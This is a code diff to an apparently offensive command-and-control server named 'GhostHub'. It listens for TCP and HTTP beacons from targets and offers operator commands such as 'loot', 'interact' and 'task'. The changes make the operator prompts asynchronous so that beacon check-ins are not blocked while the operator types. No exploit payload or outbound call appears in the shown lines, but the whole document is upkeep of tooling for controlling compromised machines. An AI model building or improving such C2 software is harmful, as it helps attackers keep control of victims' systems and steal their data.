@@ -94,8 +94,12 @@ class GhostHub:
         console.print(
             Panel(f"Target: {session['ip']}\nCommands: loot, exit", border_style="red"))
 
+        loop = asyncio.get_running_loop()
+
         while True:
-            cmd = console.input(f"[bold red]Ghost-{s_id}[/bold red]> ").strip()
+            # Wrapped in run_in_executor so typing doesn't freeze the HTTP Beacons checking in!
+            cmd = await loop.run_in_executor(None, console.input, f"[bold red]Ghost-{s_id}[/bold red]> ")
+            cmd = cmd.strip()
 
             if cmd == "back":
                 break
@@ -130,8 +134,9 @@ class GhostHub:
 
 async def async_hub_entry():
     draw_header("GHOST-HUB C2 (Dual Stack)")
-    port = questionary.text(
-        "Listen Port (TCP & HTTP Beacons):", default="4444", style=Q_STYLE).ask()
+
+    # Swapped to .ask_async() to play nice with the event loop
+    port = await questionary.text("Listen Port (TCP & HTTP Beacons):", default="4444", style=Q_STYLE).ask_async()
 
     tcp_hub = GhostHub(port=port)
     http_hub = HttpBeaconHub(port=int(port)+1)  # HTTP beacons run on Port + 1
@@ -162,8 +167,8 @@ async def async_hub_entry():
 
             console.print(table)
 
-        cmd = questionary.text(
-            "Hub Command (interact <ID>, task <ID> <CMD>, exit):", style=Q_STYLE).ask()
+        # Swapped to .ask_async() here as well
+        cmd = await questionary.text("Hub Command (interact <ID>, task <ID> <CMD>, exit):", style=Q_STYLE).ask_async()
         if not cmd:
             continue
 
